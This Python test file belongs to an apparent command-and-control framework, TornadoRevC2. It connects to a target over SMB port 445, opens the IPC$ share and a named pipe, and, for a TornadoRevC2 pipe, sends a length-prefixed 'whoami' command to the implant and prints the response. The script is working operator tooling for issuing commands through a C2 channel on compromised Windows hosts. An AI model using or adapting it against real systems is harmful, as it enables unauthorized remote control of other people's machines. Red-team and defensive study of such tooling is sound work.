"""
Standalone SMB named-pipe probe for TornadoRevC2.

Usage:
    python3 tests/smb_probe.py <target-ip> [<pipe-name>] [<user>] [<pass>] [<domain>]

If a pipe name is omitted, this script uses the well-known `srvsvc` pipe
as a reachability check. Against a real Windows host, a successful
connection proves:
  - TCP 445 is open from the operator
  - SMB dialect negotiation works
  - The provided credentials (or anonymous session) are accepted
  - The IPC$ tree can be opened
  - Named pipes can be opened by name

For a live TornadoRevC2 pipe, pass the exact name you gave
to `smbswitch --pipe <name>`.
"""

import sys
import time
import struct

from smbprotocol.connection import Connection
from smbprotocol.session import Session
from smbprotocol.tree import TreeConnect
from smbprotocol.open import (
    Open, CreateDisposition, CreateOptions,
    FilePipePrinterAccessMask, ImpersonationLevel,
)


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    host     = sys.argv[1]
    pipe     = sys.argv[2] if len(sys.argv) > 2 else 'srvsvc'
    username = sys.argv[3] if len(sys.argv) > 3 else ''
    password = sys.argv[4] if len(sys.argv) > 4 else ''
    domain   = sys.argv[5] if len(sys.argv) > 5 else ''

    print(f"[*] target : {host}:445")
    print(f"[*] pipe   : \\\\.\\pipe\\{pipe}")
    print(f"[*] user   : {domain}\\{username}" if domain else f"[*] user   : {username}")

    t0 = time.time()
    conn = Connection(host, 445, require_signing=False, timeout=10.0)
    conn.connect(timeout=10.0)
    print(f"[+] TCP + SMB negotiate OK ({time.time()-t0:.2f}s) "
          f"dialect={conn.dialect.name}")

    sess = Session(conn, username, password, require_encryption=False)
    sess.connect()
    print(f"[+] session established ({time.time()-t0:.2f}s)")

    tree = TreeConnect(sess, rf"\\{host}\IPC$")
    tree.connect()
    print(f"[+] IPC$ tree connected ({time.time()-t0:.2f}s)")

    p = Open(tree, pipe)
    p.open(
        ImpersonationLevel.Impersonation,
        FilePipePrinterAccessMask.FILE_READ_DATA
        | FilePipePrinterAccessMask.FILE_WRITE_DATA,
        create_options=CreateOptions.FILE_NON_DIRECTORY_FILE,
        create_disposition=CreateDisposition.FILE_OPEN,
    )
    print(f"[+] pipe \\\\.\\pipe\\{pipe} opened ({time.time()-t0:.2f}s)")

    # If it's a TornadoRevC2 pipe, it expects a 4-byte LE length then
    # that many bytes of payload. Send `whoami\r\n` and read the response.
    if pipe != 'srvsvc':
        cmd = b'whoami\r\n'
        p.write(struct.pack('<I', len(cmd)) + cmd)
        try:
            hdr = p.read(4)
            if len(hdr) == 4:
                (n,) = struct.unpack('<I', hdr)
                out = p.read(n) if n else b''
                print(f"[+] response ({n} bytes): {out!r}")
        except Exception as e:
            print(f"[!] read failed (pipe may be read-blocked): {e}")

    p.close()
    tree.disconnect()
    sess.disconnect()
    conn.disconnect()
    print("[+] done")


if __name__ == '__main__':
    main()